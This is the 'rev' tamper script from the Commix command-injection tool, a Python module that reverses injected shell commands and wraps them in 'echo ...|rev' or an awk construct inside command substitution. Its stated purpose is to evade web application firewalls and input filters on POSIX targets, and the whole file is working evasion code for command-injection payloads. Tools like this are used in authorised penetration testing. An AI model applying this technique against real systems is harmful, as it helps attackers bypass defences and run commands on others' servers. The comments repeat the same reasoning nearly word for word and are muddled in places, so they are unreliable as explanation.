#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

from src.utils import settings
from src.core.controller import checks

"""
About: Reverses (characterwise) the user-supplied operating system commands in a given payload.
Notes: This tamper script works against target(s) with a POSIX shell. Reading a command back
       from its end needs an operator either way, so the form handed over is the one whose
       operator the payload is already proving: 'awk' - which takes the words as arguments - where
       the separator under test is a ';' or a newline, those being what awk puts between its own
       statements, and 'rev' reading from a pipe where it is anything else. A filter strips one of
       ';', '&' and '|' together with the others, so a target that let a '&' separator through is
       not the one that stops the pipe.
References: [1] https://github.com/commixproject/commix/issues/408
            [2] https://medium.com/picus-security/how-to-bypass-wafs-for-os-command-injection-2c5dd4e6a52b
"""

__tamper__ = "rev"
__priority__ = settings.PRIORITY.HIGHER

# Why this script cannot be applied to the target at hand, or nothing where it can.
def dependencies():
  return checks.tamper_dep_unix_only(__tamper__)

if not settings.TAMPER_SCRIPTS[__tamper__]:
  settings.TAMPER_SCRIPTS[__tamper__] = True

# Hand the command over reversed, for the target to read back from its end.
def tamper(payload):
  # A target settled as Windows after this script was accepted: 'cmd.exe' has no command substitution to reverse the command back through.
  if settings.TARGET_OS == settings.OS.WINDOWS:
    return payload
  # An empty 'USER_APPLIED_CMD' is still "in" any string, so the replace below would otherwise
  # insert the reversed-empty-string construct between every character of the payload - a
  # verification litmus built after a finding confirms (and so after exploitation phase starts)
  # has no command of its own to reverse at all.
  if settings.EXPLOITATION_PHASE and settings.USER_APPLIED_CMD:
    source = payload if settings.USER_APPLIED_CMD in payload else settings.RAW_PAYLOAD
    if settings.USER_APPLIED_CMD in source:
      # 'rev' reads its input through a pipe and awk reads its own program through a ';' or a
      # newline, so the form handed over is the one whose operator is the separator under test.
      # Reading a command back from its end needs an operator either way: awk puts a ';' or a
      # newline between its own statements, 'rev' reads from a pipe. Where one of them is the
      # separator under test, that is the form handed over. Where neither is - a '&' or '&&'
      # separator - the pipe goes anyway: a filter that strips one of ';', '&' and '|' strips the
      # others with it, so a target that let '&' through is not the one that stops a pipe.
      separator = checks.current_separator()
      if checks.awk_separator_usable(separator):
        reversed_cmd = "awk" + settings.SINGLE_WHITESPACE + checks.awk_reverse_program(separator) + settings.SINGLE_WHITESPACE + settings.USER_APPLIED_CMD[::-1]
      else:
        reversed_cmd = "echo" + settings.SINGLE_WHITESPACE + settings.USER_APPLIED_CMD[::-1] + "|rev"
      if checks.using_backticks():
        rev_cmd = "\\`" + reversed_cmd + "\\`"
      else:
        rev_cmd = settings.CMD_SUB_PREFIX + reversed_cmd + settings.CMD_SUB_SUFFIX
      # Applied to the payload as handed over, not to the untouched original: the scripts run in
      # order, and reaching back past the ones before would throw their work away.
      payload = source.replace(settings.USER_APPLIED_CMD, rev_cmd)
      if len(settings.WHITESPACES) != 0:
        payload = payload.replace(settings.SINGLE_WHITESPACE, settings.WHITESPACES[0])
  return payload

# eof
